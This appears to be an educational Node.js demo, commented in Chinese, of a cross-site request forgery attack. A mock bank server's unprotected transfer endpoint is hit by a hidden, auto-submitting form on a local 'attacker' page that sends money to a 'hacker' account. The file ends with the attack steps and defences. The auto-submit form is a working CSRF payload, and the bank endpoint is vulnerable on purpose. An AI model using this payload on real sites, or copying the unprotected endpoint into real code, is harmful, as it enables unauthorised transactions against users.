const http = require('http')
const qs = require('querystring')
const URL = require('url')

// 模拟账户
const account = {
  keliq: 1000,
  hacker: 0,
}

// 路由分发器
const routes = {
  'localhost:3000': (req, res) => {
    const from = req.cookies.session
    if (!from && req.path !== '/login') return res.end('请先登录')
    switch (req.path) {
      case '/login': // 登录接口
        res.setHeader('Set-Cookie', ['session=keliq; httpOnly=true;']) // 设置 httpOnly Cookie 不能阻止 CSRF 攻击
        res.end('<h2>欢迎您，keliq！</h2>')
        break
      case '/balance': // 余额查询接口
        res.end(`${from}的账户余额为：${account[from]}`)
        break
      case '/transfer': // POST 类型的转账接口
        const arr = []
        req
          .on('data', (data) => arr.push(data))
          .on('end', () => {
            const { to, money } = qs.parse(Buffer.concat(arr).toString()) // 从 body 中解析 to 和 money 参数
            account[from] -= money
            account[to] += money
            const str = `${from}向${to}转账成功，金额${money}`
            console.log(str)
            res.end(str)
          })
        break
      default:
        res.end('404')
    }
  },
  '127.0.0.1:4000': (req, res) => {
    // 请使用 Firefox 或 Safari 测试（新版 Chrome 浏览器 cookie samesite 默认值为 Lax，所以 POST 攻击方式不可行，除非源站设置 SameSite=None; Secure;
    res.end(`
<h2>看起来像正规网站，你永远不知道背后发生了什么！</h2>
<iframe name="hideIframe" style="display: none"></iframe>
<form
  id="form" target="hideIframe" method="POST"
  enctype="application/x-www-form-urlencoded"
  action="http://localhost:3000/transfer"
  style="display: none"
>
  <input type="text" name="to" value="hacker" />
  <input type="number" name="money" value="100" />
</form>
<script>form.submit()</script>
    `)
  },
}

function onRequest(req, res) {
  const { url, headers } = req // 获取 url 和 headers
  const cookies = qs.parse(headers.cookie, '; ') // 从 headers 中解析出 cookies 对象
  const { query, pathname } = URL.parse(url, true) // 从 url 中解析出 query 和 path 对象
  Object.assign(req, { query, path: pathname, cookies }) // 扩展 req
  const route = routes[headers.host] // 根据 host 分发路由（策略模式）
  res.setHeader('content-type', 'text/html;charset=utf-8')
  if (route) return route(req, res)
  res.statusCode = 404 && res.end('Not Found')
}

http.createServer(onRequest).listen(3000) // 被攻击的网站
http.createServer(onRequest).listen(4000) // 攻击者的网站


/*
  攻击步骤：
  1. 受害者登录网站 http://localhost:3000/login 获取 Cookie 凭证
    1.1 受害者先查询自己的余额 http://localhost:3000/balance
  2. 攻击者诱导受害者进入第三方网站 http://127.0.0.1:4000
  3. 受害者点击 GET 类型的链接，发送跨站请求，自动转账给攻击者
    3.1 再次查询自己的余额 http://localhost:3000/balance

  防御措施：
  1. 在表单中加入一个 hidden 的 csrfToken 值
  2. CORS 白名单 + 自定义 header
  3. 使用 JWT 做认证
*/
